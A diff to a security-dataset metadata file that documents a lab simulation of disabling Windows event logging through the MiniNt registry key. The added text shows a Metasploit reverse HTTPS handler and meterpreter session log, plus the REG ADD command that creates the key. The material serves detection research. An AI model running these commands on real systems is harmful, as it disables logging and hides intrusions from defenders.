@@ -17,7 +17,7 @@ description: |-
 
   After rebooting the system and trying to access event logs trough the Event Viewer application, we got the following message: Event Viewer cannot open the event log or custom view. Verify that Event Log service is running or query is too long. The request is not supported (50).
 
-  We have simulated this procedure using the REG meterpreter command and the PowerShell module from Metasploit.
+  We have simulated this attack using 3 different procedures: REG command via cmd.exe, REG meterpreter command (Metasploit), and the PowerShell module (Metasploit).
   
   These datasets describe the before-rebooitng phase of the simulation, and they were generated using a Windows 10 Pro Evaluation edition (Version:1903,OS Build:18362.30).
 attack_mappings:
@@ -35,9 +35,17 @@ files:
   link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_stop_event_logging_controlset_minint_key.zip
 - type: Host
   link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_stop_event_logging_controlset001_minint_key.zip
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_stop_event_logging_controlset_minint_key.zip
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_stop_event_logging_controlset001_minint_key.zip
 simulation:
   environment: Lab VM
   tools:
+    - type: Manual
+      name: cmd
+      module: cmd
+      script:
     - type: Manual
       name: Metasploit
       module: reg
@@ -49,6 +57,28 @@ simulation:
   permissions_required:
     - Administrator
   adversary_view: |-
+    **** Using reg command via cmd.exe:
+
+    msf6 exploit(multi/handler) > run 
+
+    [*] Started HTTPS reverse handler on https://192.168.56.40:8443 
+    [*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: vtlafkal) Staging x64 payload (201308 bytes) ... 
+    [*] Meterpreter session 11 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-03 22:22:26 -0400 
+
+    meterpreter > shell 
+
+    Process 8784 created. 
+    Channel 1 created. 
+    Microsoft Windows [Version 10.0.18362.30] 
+    (c) 2019 Microsoft Corporation. All rights reserved.  
+
+    C:\Users\IT01-Pedro\Downloads>REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MiniNt 
+
+    REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MiniNt 
+    The operation completed successfully. 
+
+    C:\Users\IT01-Pedro\Downloads> 
+
     **** Using reg meterpreter command:
 
     msf6 exploit(multi/handler) > run 
@@ -91,3 +121,4 @@ references:
 - https://twitter.com/0gtweet/status/1182516740955226112
 - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-item?view=powershell-7.2
 - https://www.offensive-security.com/metasploit-unleashed/interacting-registry/
+- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg
